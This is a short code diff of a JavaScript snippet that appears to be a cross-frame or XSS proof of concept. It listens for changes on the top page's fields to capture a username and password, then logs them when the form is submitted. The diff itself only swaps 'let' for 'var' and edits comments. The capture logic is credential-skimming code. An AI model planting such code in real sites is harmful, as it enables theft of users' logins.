@@ -4,8 +4,8 @@ top.console.log('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?')
 // f = document.createElement("iframe");
 // f.id = "pwn";
 // f.src = "/";
-let user;
-let pw;
+var user;
+var pw;
 // f.onload = () => {
 
 top.document.addEventListener('change', e => {
@@ -15,9 +15,9 @@ top.document.addEventListener('change', e => {
     pw = e.target.value
   }
 }, false)
-
   // top.username.addEventListener('change', e => user = e.target.value);
   // top.password.addEventListener('change', e => user = e.target.value);
+  //
   top.document.forms[0].addEventListener('submit', () => {
     console.log("submitting a form", user, pw);
 
